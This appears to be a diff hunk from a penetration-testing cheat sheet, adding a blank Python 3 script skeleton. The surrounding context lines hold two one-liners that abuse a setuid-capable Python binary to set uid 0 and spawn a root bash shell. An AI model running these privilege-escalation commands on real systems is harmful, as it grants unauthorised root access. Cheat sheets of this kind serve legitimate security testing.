@@ -3494,6 +3494,23 @@ try:
 except: 
     print "Connection failed!"
 
+
+# simple script skeleton with functions
+## PY3
+#!/usr/bin/env python3
+
+import some_library
+
+def main():
+    some_function()
+    
+def some_function():
+    some_code_here
+    
+if __name__ == "__main__":
+    main()
+
+
 # python with setuid capability? --> spawn root shell
 python -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
 python3 -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
